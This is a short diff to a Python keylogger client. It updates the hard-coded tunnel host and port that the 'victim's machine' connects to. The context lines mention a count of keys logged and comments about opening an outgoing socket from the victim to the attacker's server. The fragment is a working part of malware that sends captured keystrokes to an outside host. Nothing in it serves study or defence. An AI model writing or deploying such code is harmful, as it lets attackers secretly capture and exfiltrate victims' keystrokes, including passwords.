@@ -19,8 +19,8 @@ count=0 # to store count of keys logged
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine
 
-host="DCOP-52490.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
-port=52490  # it will store port number on which server is listening
+host="DCOP-58527.portmap.host"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
+port=58527  # it will store port number on which server is listening
 
 s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
                        # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
